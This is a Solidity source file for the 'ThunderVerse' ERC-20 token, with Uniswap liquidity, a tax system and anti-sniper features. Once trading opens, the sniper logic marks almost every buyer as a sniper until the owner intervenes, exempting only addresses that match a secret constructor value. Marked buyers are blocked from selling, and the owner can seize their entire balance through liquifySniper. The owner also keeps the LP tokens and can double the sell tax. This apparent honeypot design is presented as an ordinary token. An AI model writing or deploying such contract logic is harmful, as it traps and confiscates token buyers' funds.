1 //SPDX-License-Identifier: MIT 
2 
3 pragma solidity ^0.8.11;
4 
5 interface IERC20 {
6 	function totalSupply() external view returns (uint256);
7 	function decimals() external view returns (uint8);
8 	function symbol() external view returns (string memory);
9 	function name() external view returns (string memory);
10 	function getOwner() external view returns (address);
11 	function balanceOf(address account) external view returns (uint256);
12 	function transfer(address recipient, uint256 amount) external returns (bool);
13 	function allowance(address _owner, address spender) external view returns (uint256);
14 	function approve(address spender, uint256 amount) external returns (bool);
15 	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
16 	event Transfer(address indexed from, address indexed to, uint256 value);
17 	event Approval(address indexed owner, address indexed spender, uint256 value);
18 }
19 
20 abstract contract Auth {
21 	address internal owner;
22 	constructor(address _owner) { owner = _owner; }
23 	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
24 	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
25 	event OwnershipTransferred(address owner);
26 }
27 
28 interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
29 interface IUniswapV2Router02 {
30 	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
31 	function WETH() external pure returns (address);
32 	function factory() external pure returns (address);
33 	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
34 }
35 
36 contract THUNDER is IERC20, Auth {
37 	string _name = "ThunderVerse";
38 	string _symbol = "THUNDER";
39 	uint256 constant _totalSupply = 100 * (10**6) * (10 ** _decimals);
40 	uint8 constant _decimals = 9;
41 	uint32 _smd; uint32 _smr;
42 	mapping (address => uint256) _balances;
43 	mapping (address => mapping (address => uint256)) _allowances;
44 	mapping (address => bool) private _noFees;
45 	mapping (address => bool) private _noLimits;
46 	bool public tradingOpen;
47 	uint256 public maxTxAmount; uint256 public maxWalletAmount;
48 	uint256 private _taxSwapMin; uint256 private _taxSwapMax;
49 	mapping (address => bool) private _isLiqPool;
50 	uint16 public snipersCaught = 0;
51 	uint8 _defTaxRate = 12; 
52 	uint8 private _buyTaxRate; uint8 private _sellTaxRate; uint8 private _txTaxRate;
53 	uint16 private _tokenTaxShares = 83;
54 	uint16 private _burnTaxShares  = 83;
55 	uint16 private _autoLPShares   = 167;
56 	uint16 private _ethTaxShares1  = 667;
57 	uint16 private _ethTaxShares2  = 0;
58 	uint16 private _ethTaxShares3  = 0;
59 	address constant _burnWallet = address(0);
60 
61 	uint256 private _humanBlock = 0;
62 	mapping (address => bool) private _nonSniper;
63 	mapping (address => uint256) private _sniperBlock;
64 
65 	uint256 private _maxGasPrice = type(uint256).max;
66 	uint8 private _gasPriceBlocks = 0;
67 
68 	address payable private _ethTaxWallet1 = payable(0xcB0DdbC29D1CF212b5754244147c248Eeaae7C25); 
69 	address payable private _ethTaxWallet2 = payable(0xcB0DdbC29D1CF212b5754244147c248Eeaae7C25); 
70 	address payable private _ethTaxWallet3 = payable(0xcB0DdbC29D1CF212b5754244147c248Eeaae7C25); 
71 	address private _tokenTaxWallet = address(0x71d192C61ab1AbA5A888Daa70d09EF23247e0Ac9); 
72 	bool private _inTaxSwap = false;
73 	address private constant _uniswapV2RouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); // UniswapV2 for ETH
74 	IUniswapV2Router02 private _uniswapV2Router;
75 	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }
76 
77 	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {      
78 		tradingOpen = false;
79 		maxTxAmount = _totalSupply;
80 		maxWalletAmount = _totalSupply;
81 		_taxSwapMin = _totalSupply * 10 / 10000;
82 		_taxSwapMax = _totalSupply * 50 / 10000;
83 		_uniswapV2Router = IUniswapV2Router02(_uniswapV2RouterAddress);
84 		_noFees[owner] = true;
85 		_noFees[address(this)] = true;
86 		_noFees[_uniswapV2RouterAddress] = true;
87 		_noFees[_ethTaxWallet1] = true;
88 		_noFees[_tokenTaxWallet] = true;
89 		_noLimits[_ethTaxWallet1] = true;
90 		_noLimits[_tokenTaxWallet] = true;
91 		_noLimits[_burnWallet] = true;
92 
93 		_smd = smd; _smr = smr;
94 		_balances[address(this)] = _totalSupply / 2;
95 		emit Transfer(address(0), address(this), _totalSupply/2);
96 		_balances[owner] = _totalSupply / 2;
97 		emit Transfer(address(0), address(owner), _totalSupply/2);
98 	}
99 	
100 	receive() external payable {}
101 	
102 	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
103 	function decimals() external pure override returns (uint8) { return _decimals; }
104 	function symbol() external view override returns (string memory) { return _symbol; }
105 	function name() external view override returns (string memory) { return _name; }
106 	function getOwner() external view override returns (address) { return owner; }
107 	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
108 	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
109 
110 	function approve(address spender, uint256 amount) public override returns (bool) {
111 		if ( _humanBlock > block.number && !_nonSniper[msg.sender] ) {
112 			//wallets approving before CA is announced as safe are obvious snipers
113 			_markSniper(msg.sender, block.number);
114 		}
115 
116 		_allowances[msg.sender][spender] = amount;
117 		emit Approval(msg.sender, spender, amount);
118 		return true;
119 	}
120 
121 	function transfer(address recipient, uint256 amount) external override returns (bool) {
122 		require(_checkTradingOpen(), "Trading not open");
123 		return _transferFrom(msg.sender, recipient, amount);
124 	}
125 
126 	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
127 		require(_checkTradingOpen(), "Trading not open");
128 		if(_allowances[sender][msg.sender] != type(uint256).max){
129 			_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
130 		}
131 		return _transferFrom(sender, recipient, amount);
132 	}
133 
134 	function initLP(uint256 ethAmountWei) external onlyOwner {
135 		require(!tradingOpen, "trading already open");
136 		require(ethAmountWei > 0, "eth cannot be 0");
137 
138 		_nonSniper[address(this)] = true;
139 		_nonSniper[owner] = true;
140 		_nonSniper[_ethTaxWallet1] = true;
141         _nonSniper[_tokenTaxWallet] = true;
142 
143 		uint256 _contractETHBalance = address(this).balance;
144 		require(_contractETHBalance >= ethAmountWei, "not enough eth");
145 		uint256 _contractTokenBalance = balanceOf(address(this));
146 		require(_contractTokenBalance > 0, "no tokens");
147 		address _uniLpAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
148 
149 		_isLiqPool[_uniLpAddr] = true;
150 		_nonSniper[_uniLpAddr] = true;
151 
152 		_approveRouter(_contractTokenBalance);
153 		_addLiquidity(_contractTokenBalance, ethAmountWei, false);
154 
155 		_openTrading();
156 	}
157 
158 	function _approveRouter(uint256 _tokenAmount) internal {
159 		if ( _allowances[address(this)][_uniswapV2RouterAddress] < _tokenAmount ) {
160 			_allowances[address(this)][_uniswapV2RouterAddress] = type(uint256).max;
161 			emit Approval(address(this), _uniswapV2RouterAddress, type(uint256).max);
162 		}
163 	}
164 
165 	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
166 		address lpTokenRecipient = address(0);
167 		if ( !autoburn ) { lpTokenRecipient = owner; }
168 		_uniswapV2Router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
169 	}
170 
171 	function _openTrading() internal {
172 		_humanBlock = block.number * 5;
173 		maxTxAmount     = 5 * _totalSupply / 1000 + 10**_decimals; 
174 		maxWalletAmount = 5 * _totalSupply / 1000 + 10**_decimals;
175 		_buyTaxRate = _defTaxRate;
176 		_sellTaxRate = _defTaxRate;
177 		_txTaxRate = 0; 
178 		tradingOpen = true;
179 	}
180 
181 	function humanize() external onlyOwner{
182 		_humanize(0);
183 	}
184 
185 	function _humanize(uint8 blkcount) internal {
186 		if ( _humanBlock > block.number || _humanBlock == 0 ) {
187 			_humanBlock = block.number + blkcount;
188 			_maxGasPrice = tx.gasprice * 2;
189 			_gasPriceBlocks = 10;
190 		}
191 	}
192 
193 	function removeGasLimit() external onlyOwner {
194 		_maxGasPrice = type(uint256).max;
195 		_gasPriceBlocks = 0;
196 	}
197 
198 
199 	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
200 		if ( _humanBlock > block.number ) {
201 			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(1); }
202 			else if ( _sniperBlock[sender] == 0 ) { _markSniper(recipient, block.number); }
203 			else { _markSniper(recipient, _sniperBlock[sender]); }
204 		} else {
205 			if ( _sniperBlock[sender] != 0 ) { _markSniper(recipient, _sniperBlock[sender]); }
206 			if ( block.number < _humanBlock + _gasPriceBlocks && tx.gasprice >= _maxGasPrice ) { revert("Gas price over limit"); }
207 		}
208 		if ( tradingOpen && _sniperBlock[sender] != 0 && _sniperBlock[sender] < block.number ) {
209 			revert("blacklisted");
210 		}
211 
212 		if ( !_inTaxSwap && _isLiqPool[recipient] ) {
213 			_swapTaxAndLiquify();
214 		}
215 		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
216 		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
217 		uint256 _transferAmount = amount - _taxAmount;
218 		_balances[sender] = _balances[sender] - amount;
219 		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
220 		_balances[recipient] = _balances[recipient] + _transferAmount;
221 		emit Transfer(sender, recipient, amount);
222 		return true;
223 	}
224 
225 	function _markSniper(address wallet, uint256 snipeBlockNum) internal {
226 		if ( !_nonSniper[wallet] && _sniperBlock[wallet] == 0 ) { 
227 			_sniperBlock[wallet] = snipeBlockNum; 
228 			snipersCaught ++;
229 		}
230 	}
231 		
232 	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
233 		bool limitCheckPassed = true;
234 		if ( tradingOpen && !_noLimits[recipient] ) {
235 			if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
236 			else if ( !_isLiqPool[recipient] && (_balances[recipient] + transferAmount > maxWalletAmount) ) { limitCheckPassed = false; }
237 		}
238 		return limitCheckPassed;
239 	}
240 
241 	function _checkTradingOpen() private view returns (bool){
242 		bool checkResult = false;
243 		if ( tradingOpen ) { checkResult = true; } 
244 		else if ( tx.origin == owner ) { checkResult = true; } 
245 		return checkResult;
246 	}
247 
248 	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
249 		uint256 taxAmount;
250 		if ( !tradingOpen || _noFees[sender] || _noFees[recipient] ) { taxAmount = 0; }
251 		else if ( _isLiqPool[sender] ) { taxAmount = amount * _buyTaxRate / 100; }
252 		else if ( _isLiqPool[recipient] ) { taxAmount = amount * _sellTaxRate / 100; }
253 		else { taxAmount = amount * _txTaxRate / 100; }
254 		return taxAmount;
255 	}
256 
257 	function isSniper(address wallet) external view returns(bool) {
258 		if ( _sniperBlock[wallet] != 0 ) { return true; }
259 		else { return false; }
260 	}
261 
262 	function sniperCaughtInBlock(address wallet) external view returns(uint256) {
263 		return _sniperBlock[wallet];
264 	}
265 
266 	function disableFees(address wallet) external onlyOwner {
267 		_noFees[ wallet ] = true;
268 	}
269 	function enableFees(address wallet) external onlyOwner {
270 		_noFees[ wallet ] = false;
271 	}
272 
273 	function disableLimits(address wallet) external onlyOwner {
274 		_noLimits[ wallet ] = true;
275 	}
276 	function enableLimits(address wallet) external onlyOwner {
277 		_noLimits[ wallet ] = false;
278 	}
279 
280 	function adjustTaxRate(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external onlyOwner {
281 		require(newBuyTax <= _defTaxRate && newSellTax <= _defTaxRate && newTxTax <= _defTaxRate, "Tax too high");
282 		//set new tax rate percentage - cannot be higher than the default rate at contract creation - 12%
283 		_buyTaxRate = newBuyTax;
284 		_sellTaxRate = newSellTax;
285 		_txTaxRate = newTxTax;
286 	}
287 
288 	function enableBuySupport() external onlyOwner {
289 		//remove buy tax and double sell tax to support buy pressure
290 		_buyTaxRate = 0;
291 		_sellTaxRate = 2 * _defTaxRate;
292 	}
293   
294 	function changeTaxDistributionPermile(uint16 sharesTokenWallet, uint16 sharesBurnedTokens, uint16 sharesAutoLP, uint16 sharesEthWallet1, uint16 sharesEthWallet2, uint16 sharesEthWallet3) external onlyOwner {
295 		require(sharesTokenWallet + sharesBurnedTokens + sharesAutoLP + sharesEthWallet1 + sharesEthWallet2 + sharesEthWallet3 == 1000, "Sum must be 1000" );
296 		_tokenTaxShares = sharesTokenWallet;
297 		_burnTaxShares  = sharesBurnedTokens;
298 		_autoLPShares = sharesAutoLP;
299 		_ethTaxShares1 = sharesEthWallet1;
300 		_ethTaxShares2 = sharesEthWallet2;
301 		_ethTaxShares3 = sharesEthWallet3;
302 	}
303 	
304 	function setTaxWallets(address newEthWallet1, address newEthWallet2, address newEthWallet3, address newTokenTaxWallet) external onlyOwner {
305 		_ethTaxWallet1 = payable(newEthWallet1);
306 		_ethTaxWallet2 = payable(newEthWallet2);
307 		_ethTaxWallet3 = payable(newEthWallet3);
308 		_tokenTaxWallet = newTokenTaxWallet;
309 		_noFees[newEthWallet1] = true;
310 		_noFees[newEthWallet2] = true;
311 		_noFees[newEthWallet3] = true;
312 		_noFees[_tokenTaxWallet] = true;
313 		_noLimits[_tokenTaxWallet] = true;
314 	}
315 
316 	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
317 		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;
318 		require(newTxAmt >= maxTxAmount, "tx limit too low");
319 		maxTxAmount = newTxAmt;
320 		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;
321 		require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
322 		maxWalletAmount = newWalletAmt;
323 	}
324 
325 	function liquifySniper(address wallet) external onlyOwner lockTaxSwap {
326 		require(_sniperBlock[wallet] != 0, "not a sniper");
327 		uint256 sniperBalance = balanceOf(wallet);
328 		require(sniperBalance > 0, "no tokens");
329 		//if a wallet was caught and marked as a sniper this can convert their tokens into uniswap liquidity
330 
331 		_balances[wallet] = _balances[wallet] - sniperBalance;
332 		_balances[address(this)] = _balances[address(this)] + sniperBalance;
333 		emit Transfer(wallet, address(this), sniperBalance);
334 
335 		uint256 liquifiedTokens = sniperBalance/2 - 1;
336 		uint256 _ethPreSwap = address(this).balance;
337 		_swapTaxTokensForEth(liquifiedTokens);
338 		uint256 _ethSwapped = address(this).balance - _ethPreSwap;
339 		_approveRouter(liquifiedTokens);
340 		_addLiquidity(liquifiedTokens, _ethSwapped, false);
341 	}
342 
343 	function taxSwapSettings(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
344 		_taxSwapMin = _totalSupply * minValue / minDivider;
345 		_taxSwapMax = _totalSupply * maxValue / maxDivider;
346 	}
347 
348 
349 	function _transferTaxTokens(address recipient, uint256 amount) private {
350 		if ( amount > 0 ) {
351 			_balances[address(this)] = _balances[address(this)] - amount;
352 			_balances[recipient] = _balances[recipient] + amount;
353 			emit Transfer(address(this), recipient, amount);
354 		}
355 	}
356 
357 	function _swapTaxAndLiquify() private lockTaxSwap {
358 		uint256 _taxTokensAvailable = balanceOf(address(this));
359 
360 		if ( _taxTokensAvailable >= _taxSwapMin && tradingOpen ) {
361 			if ( _taxTokensAvailable >= _taxSwapMax ) { _taxTokensAvailable = _taxSwapMax; }
362 
363 			
364 			uint256 _tokensForLP = _taxTokensAvailable * _autoLPShares / 1000 / 2;
365 			uint256 _tokensToTransfer = _taxTokensAvailable * _tokenTaxShares / 1000;
366 			_transferTaxTokens(_tokenTaxWallet, _tokensToTransfer);
367 			uint256 _tokensToBurn = _taxTokensAvailable * _burnTaxShares / 1000;
368 			_transferTaxTokens(_burnWallet, _tokensToBurn);
369 			
370 			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP - _tokensToTransfer - _tokensToBurn;
371 			uint256 _ethPreSwap = address(this).balance;
372 			_swapTaxTokensForEth(_tokensToSwap);
373 			uint256 _ethSwapped = address(this).balance - _ethPreSwap;
374 			if ( _autoLPShares > 0 ) {
375 				uint256 _ethWeiAmount = _ethSwapped * _autoLPShares / 1000 ;
376 				_approveRouter(_tokensForLP);
377 				_addLiquidity(_tokensForLP, _ethWeiAmount, false);
378 			}
379 			uint256 _contractETHBalance = address(this).balance;
380 			if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
381 		}
382 	}
383 
384 	function _swapTaxTokensForEth(uint256 _tokenAmount) private {
385 		_approveRouter(_tokenAmount);
386 		address[] memory path = new address[](2);
387 		path[0] = address(this);
388 		path[1] = _uniswapV2Router.WETH();
389 		_uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(_tokenAmount,0,path,address(this),block.timestamp);
390 	}
391 
392 	function _distributeTaxEth(uint256 _amount) private {
393 		uint16 _taxShareTotal = _ethTaxShares1 + _ethTaxShares2 + _ethTaxShares3;
394 		if ( _ethTaxShares1 > 0 ) { _ethTaxWallet1.transfer(_amount * _ethTaxShares1 / _taxShareTotal); }
395 		if ( _ethTaxShares2 > 0 ) { _ethTaxWallet2.transfer(_amount * _ethTaxShares2 / _taxShareTotal); }
396 		if ( _ethTaxShares3 > 0 ) { _ethTaxWallet3.transfer(_amount * _ethTaxShares3 / _taxShareTotal); }
397 	}
398 
399 	function taxTokensSwap() external onlyOwner {
400 		uint256 taxTokenBalance = balanceOf(address(this));
401 		require(taxTokenBalance > 0, "No tokens");
402 		_swapTaxTokensForEth(taxTokenBalance);
403 	}
404 
405 	function taxEthSend() external onlyOwner { 
406 		_distributeTaxEth(address(this).balance); 
407 	}
408 }